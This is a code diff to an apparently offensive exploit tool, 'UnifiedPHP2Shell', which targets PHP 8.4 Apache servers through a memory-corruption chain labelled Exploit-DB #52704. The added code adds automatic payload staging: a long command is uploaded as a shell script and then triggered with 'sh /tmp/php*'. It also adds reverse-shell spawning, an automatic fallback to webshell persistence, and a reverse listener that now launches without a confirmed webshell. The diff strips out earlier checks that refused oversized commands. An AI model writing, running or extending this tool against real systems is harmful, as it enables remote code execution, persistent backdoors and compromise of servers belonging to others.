@@ -313,6 +313,7 @@ DEFAULT_DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR
 DEFAULT_HTDATA_OFFSET = 0x6E0D8     # lab build fake HashTable offset
 BOOKWORM_HTDATA_OFFSET = 0x690D8    # official php:8.4.26-apache offset
 MAX_CMD_LEN = 14
+DEFAULT_STAGED_TRIGGER = "sh /tmp/php*"
 DEFAULT_SID = b"attacksessionid0001"
 
 BOOKWORM_STAGE1_N = 841
@@ -678,13 +679,15 @@ class RawHttpTarget:
 class ExploitDB52704Engine:
     def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: int = DEFAULT_ZIF_OFFSET,
                  dtor_offset: int = DEFAULT_DTOR_OFFSET, htdata_offset: Optional[int] = None,
-                 huge_mb: int = 12, profile: str = "bookworm"):
+                 huge_mb: int = 12, profile: str = "bookworm",
+                 staged_payload: Optional[bytes] = None):
         self.t = target
         self.cmd = cmd.encode("latin1")
         self.zif_offset = zif_offset
         self.dtor_offset = dtor_offset
         self.huge_mb = huge_mb
         self.profile = profile
+        self.staged_payload = staged_payload
 
         if profile == "bookworm":
             self.stage1_n = BOOKWORM_STAGE1_N
@@ -705,7 +708,8 @@ class ExploitDB52704Engine:
         return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}
 
     def _file_part(self) -> dict:
-        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
+        data = self.staged_payload if self.staged_payload is not None else b"A" * 64
+        return {"name": "f", "filename": "payload.sh", "data": data}
 
     def rotate(self) -> None:
         parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
@@ -1266,6 +1270,7 @@ class UnifiedPHP2Shell:
         method: str = "auto",
         profile: str = "bookworm",
         cmd: str = "id; whoami; uname -a",
+        carrier_trigger: Optional[str] = None,
         webshell_name: str = DEFAULT_WEBSHELL_NAME,
         spawn_reverse: bool = False,
         lhost: Optional[str] = None,
@@ -1288,21 +1293,36 @@ class UnifiedPHP2Shell:
         if method in ("auto", "binary", "52704", "exploitdb"):
             self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
             try:
-                carrier_cmd = cmd.strip()
+                target_cmd = cmd.strip()
+                if spawn_reverse and lhost:
+                    target_cmd = generate_reverse_shell_cmd(lhost, lport)
+
                 try:
-                    carrier_bytes = carrier_cmd.encode("latin1")
+                    cmd_bytes = target_cmd.encode("latin1")
                 except UnicodeEncodeError:
                     res.status = ExploitStatus.ERROR
-                    res.details = "Command cannot be represented in the carrier's Latin-1 encoding."
+                    res.details = "Command cannot be represented in Latin-1 encoding."
                     return res
-                if len(carrier_bytes) > MAX_CMD_LEN:
-                    res.status = ExploitStatus.ERROR
-                    res.details = (
-                        f"Command is {len(carrier_bytes)} bytes; this build's carrier supports at most "
-                        f"{MAX_CMD_LEN}. No command was substituted or dispatched."
+
+                # Automatic payload staging if command exceeds MAX_CMD_LEN (14 bytes)
+                staged_payload = None
+                if len(cmd_bytes) <= MAX_CMD_LEN and not carrier_trigger:
+                    carrier_cmd = target_cmd
+                else:
+                    trigger = carrier_trigger or DEFAULT_STAGED_TRIGGER
+                    trigger_bytes = trigger.strip().encode("latin1")
+                    if len(trigger_bytes) > MAX_CMD_LEN:
+                        res.status = ExploitStatus.ERROR
+                        res.details = f"Trigger command ({len(trigger_bytes)}B) exceeds carrier limit ({MAX_CMD_LEN}B)."
+                        self.progress("  └─ [Exploit-DB #52704]", res.details, Fore.YELLOW)
+                        return res
+                    carrier_cmd = trigger.strip()
+                    staged_payload = b"#!/bin/sh\n" + cmd_bytes + b"\n"
+                    self.progress(
+                        "  └─ [Auto-Staging]:",
+                        f"Command ({len(cmd_bytes)}B > {MAX_CMD_LEN}B limit) automatically staged via multipart upload -> trigger: '{carrier_cmd}'",
+                        Fore.CYAN,
                     )
-                    self.progress("  └─ [Exploit-DB #52704]", res.details, Fore.YELLOW)
-                    return res
 
                 raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False)
                 engine_52704 = ExploitDB52704Engine(
@@ -1313,6 +1333,7 @@ class UnifiedPHP2Shell:
                     htdata_offset=htdata_offset,
                     huge_mb=huge_mb,
                     profile=profile,
+                    staged_payload=staged_payload,
                 )
 
                 # A pre-existing local file is not evidence of this exploit attempt.
@@ -1392,10 +1413,18 @@ class UnifiedPHP2Shell:
                             "was obtained. Do not report this as a confirmed compromise."
                         )
                         self.progress("  └─ [Exploit-DB #52704]:", "Dispatch unconfirmed; no proof of execution.", Fore.YELLOW)
-                        return res
+                        if method != "auto":
+                            return res
 
             except Exception as e:
                 self.progress("  └─ [Exploit-DB #52704]:", f"Notice: {e}", Fore.YELLOW)
+                if method != "auto":
+                    res.status = ExploitStatus.ERROR
+                    res.details = f"Binary chain failed: {e}"
+                    return res
+
+            if method == "auto":
+                self.progress("  └─ [Auto-Chain Fallback]:", "Binary stage unconfirmed; proceeding to multipart webshell persistence...", Fore.YELLOW)
 
         # -------------------------------------------------------------------
         # Path B: Multipart OOM / UAF Webshell Persistence Dropper
@@ -1722,6 +1751,8 @@ def build_cli() -> argparse.ArgumentParser:
     p.add_argument("--huge-mb", type=int, default=12, help="Memory allocation in MB to trigger OOM")
     p.add_argument("--lhost", help="Local IP for reverse shell")
     p.add_argument("--lport", type=int, default=4444, help="Local port for reverse shell")
+    p.add_argument("--carrier-trigger", default=None,
+                   help="Custom short trigger command for staged exploit payload (default: 'sh /tmp/php*')")
     p.add_argument("--reverse", action="store_true", help="Spawn reverse shell callback")
     return p
 
@@ -1827,6 +1858,7 @@ def main() -> int:
                 method=args.exploit_method,
                 profile=args.exploit_profile,
                 cmd=args.cmd,
+                carrier_trigger=args.carrier_trigger,
                 webshell_name=args.webshell_name,
                 spawn_reverse=args.reverse or bool(args.lhost),
                 lhost=args.lhost,
@@ -1841,7 +1873,7 @@ def main() -> int:
             t_res["exploit_result"] = asdict(er)
 
             # Interactive Shell / Reverse Listener Trigger
-            if (args.reverse or args.lhost) and er.webshell_url:
+            if args.reverse or args.lhost:
                 lhost_ip = args.lhost or "127.0.0.1"
                 pipe.launch_reverse_listener(lhost_ip, args.lport, er.webshell_url, DEFAULT_PARAM)
             elif do_shell and er.webshell_url:
